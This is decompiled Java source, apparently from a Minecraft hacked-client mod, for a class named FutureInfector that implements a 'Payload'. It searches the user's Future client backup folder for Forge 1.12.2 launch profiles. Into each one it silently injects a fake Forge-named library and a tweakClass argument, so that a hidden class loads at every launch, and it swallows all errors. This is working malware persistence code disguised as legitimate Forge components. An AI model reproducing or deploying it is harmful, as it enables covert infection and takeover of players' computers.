//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\Admin\Desktop\Minecraft-Deobfuscator3000-1.2.2\1.12 stable mappings"!

//Decompiled by Procyon!

package me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.payload.impl;

import me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.payload.*;
import java.io.*;
import java.util.*;
import java.nio.charset.*;
import java.nio.file.*;
import com.google.gson.*;

public final class FutureInfector implements Payload
{
    @Override
    public void execute() throws Exception {
        try {
            final File file = new File(System.getProperty("user.home") + "\\Future\\backup");
            if (file.isDirectory()) {
                for (final File f : Objects.requireNonNull(file.listFiles())) {
                    if (f.getName().contains("1.12.2") && f.getName().contains("forge")) {
                        final String json = new String(Files.readAllBytes(Paths.get(f.getAbsolutePath(), new String[0])), StandardCharsets.UTF_8);
                        if (!json.contains("--tweakClass net.minecraftforge.modloader.Tweaker")) {
                            final JsonObject thing = new JsonParser().parse(json).getAsJsonObject();
                            final JsonArray array = thing.getAsJsonArray("libraries");
                            final JsonObject object = new JsonObject();
                            object.addProperty("name", "net.minecraftforge:injector:forgedefault");
                            array.add((JsonElement)object);
                            final String args = thing.get("minecraftArguments").getAsString();
                            thing.remove("minecraftArguments");
                            thing.addProperty("minecraftArguments", args + " --tweakClass net.minecraftforge.modloader.Tweaker");
                            Files.write(Paths.get(f.getAbsolutePath(), new String[0]), thing.toString().getBytes(StandardCharsets.UTF_8), new OpenOption[0]);
                        }
                    }
                }
            }
        }
        catch (Exception ex) {}
    }
}
